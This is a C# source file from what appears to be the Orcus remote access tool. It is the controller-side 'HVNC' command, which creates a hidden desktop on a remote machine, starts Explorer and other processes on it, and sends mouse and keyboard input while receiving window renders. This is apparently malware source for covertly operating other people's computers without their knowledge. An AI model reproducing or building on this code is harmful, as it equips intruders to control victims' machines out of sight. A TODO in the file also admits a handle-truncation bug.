#if DEBUG
using System;
using System.Collections.Generic;
using System.Text;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.NetSerializer;
using WindowUpdate = Orcus.Shared.Commands.HVNC.WindowUpdate;

namespace Orcus.Administration.Commands.HVNC
{
    public class HvncCommand : Command
    {
        public bool IsOpen { get; private set; }
        public RenderEngine RenderEngine { get; private set; }

        public override void Dispose()
        {
            RenderEngine?.Dispose();
        }

        public event EventHandler IsOpenChanged;
        public event EventHandler RenderEngineUpdated;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((HvncCommunication) parameter[0])
            {
                case HvncCommunication.ResponseDesktopCreated:
                    IsOpen = true;
                    IsOpenChanged?.Invoke(this, EventArgs.Empty);

                    RenderEngine = new RenderEngine(BitConverter.ToInt32(parameter, 1),
                        BitConverter.ToInt32(parameter, 5), RequestInformationDelegate);
                    RenderEngineUpdated?.Invoke(this, EventArgs.Empty);

                    LogService.Receive("Desktop created");
                    break;
                case HvncCommunication.ResponseUpdate:
                    RenderEngine.Update(new Serializer(typeof (WindowUpdate)).Deserialize<WindowUpdate>(parameter, 1));
                    break;
                case HvncCommunication.ResponseUpdateFailed:
                    RenderEngine?.UpdateFailed();
                    break;
                case HvncCommunication.ResponseDesktopNotOpened:
                    LogService.Error("Desktop was not initialized");
                    break;
                case HvncCommunication.ResponseDesktopClosed:
                    IsOpen = false;
                    IsOpenChanged?.Invoke(this, EventArgs.Empty);

                    RenderEngine.Stop();
                    RenderEngine.Dispose();
                    RenderEngine = null;
                    RenderEngineUpdated?.Invoke(this, EventArgs.Empty);
                    break;
                case HvncCommunication.ResponseProcessExecuted:
                    LogService.Receive("Process executed");
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void CreateDesktop(string desktopName, bool startExplorer)
        {
            if (IsOpen)
                throw new InvalidOperationException();

            var createDesktopInformationData =
                new Serializer(typeof (CreateDesktopInformation)).Serialize(new CreateDesktopInformation
                {
                    CustomName = desktopName,
                    StartExplorer = startExplorer
                });

            var data = new byte[createDesktopInformationData.Length + 1];
            data[0] = (byte) HvncCommunication.CreateDesktop;
            Array.Copy(createDesktopInformationData, 0, data, 1, createDesktopInformationData.Length);

            ConnectionInfo.SendCommand(this, data);
            LogService.Send("Create desktop");
        }

        public void CloseDesktop()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) HvncCommunication.CloseDesktop});
            LogService.Send("Close desktop");
            RenderEngine.Dispose();
        }

        public void MouseAction(HvncAction action, int x, int y)
        {
            var package = new List<byte> {(byte) HvncCommunication.DoAction, (byte) action};
            package.AddRange(BitConverter.GetBytes(x));
            package.AddRange(BitConverter.GetBytes(y));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void MouseAction(HvncAction action)
        {
            ConnectionInfo.SendCommand(this,
                new[] {(byte) HvncCommunication.DoAction, (byte) action});
        }

        public void KeyboardAction(byte keyCode, bool isPressed)
        {
            ConnectionInfo.SendCommand(this,
                new[]
                {
                    (byte) HvncCommunication.DoAction,
                    (byte) (isPressed ? HvncAction.KeyPressed : HvncAction.KeyReleased), keyCode
                });
        }

        public void OpenProcess(string processName)
        {
            var processNameData = Encoding.UTF8.GetBytes(processName);
            var data = new byte[processNameData.Length + 1];
            data[0] = (byte) HvncCommunication.ExecuteProcess;
            Array.Copy(processNameData, 0, data, 1, processNameData.Length);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send("Execute process");
        }

        private void RequestInformationDelegate(Int64 windowToRender)
        {
            //TODO: Int was changed to int64 -> error
            var updateData = new byte[5];
            updateData[0] = (byte) HvncCommunication.GetUpdate;
            Array.Copy(BitConverter.GetBytes(windowToRender), 0, updateData, 1, 4);
            ConnectionInfo.SendCommand(this, updateData);
        }

        protected override uint GetId()
        {
            return 23;
        }
    }
}
#endif